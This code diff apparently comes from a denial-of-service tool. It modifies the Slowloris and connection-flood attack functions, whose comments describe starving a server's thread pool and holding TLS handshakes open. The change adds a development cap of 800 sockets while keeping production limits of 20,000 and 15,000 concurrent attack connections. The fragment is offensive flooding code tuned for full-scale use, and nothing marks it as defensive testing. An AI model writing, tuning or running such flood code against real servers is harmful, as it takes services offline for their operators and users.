@@ -746,7 +746,11 @@ async function runSlowlorisReal(
   useHttps = false,
 ): Promise<void> {
   // 80 connections per thread — trickle headers every 10-25s, starves server thread pool
-  const MAX_CONN = Math.min(threads * 80, 20000);
+  // DEV cap: container limit ~4GB; PROD (32GB): full 20K sockets
+  const IS_DEV = process.env.NODE_ENV !== "production";
+  const MAX_CONN = IS_DEV
+    ? Math.min(threads * 8, 800)            // dev: max 800 sockets (~64MB TLS)
+    : Math.min(threads * 80, 20000);        // prod: max 20K sockets
   let localPkts = 0, localBytes = 0, activeConns = 0;
   const flush = () => { onStats(localPkts, localBytes, activeConns); localPkts = 0; localBytes = 0; };
   const flushIv = setInterval(flush, 250);
@@ -849,7 +853,11 @@ async function runConnFlood(
   useHttps = false,
 ): Promise<void> {
   // 60 connections per thread — holds TLS handshake open, recycles every 5-20ms
-  const MAX_CONN = Math.min(threads * 60, 15000);
+  // DEV cap: container limit ~4GB; PROD (32GB): full 15K sockets
+  const IS_DEV_CF = process.env.NODE_ENV !== "production";
+  const MAX_CONN = IS_DEV_CF
+    ? Math.min(threads * 8, 800)            // dev: max 800 sockets (~64MB TLS)
+    : Math.min(threads * 60, 15000);        // prod: max 15K sockets
   let localPkts = 0, localBytes = 0, activeConns = 0;
   const flush = () => { onStats(localPkts, localBytes, activeConns); localPkts = 0; localBytes = 0; };
   const flushIv = setInterval(flush, 250);
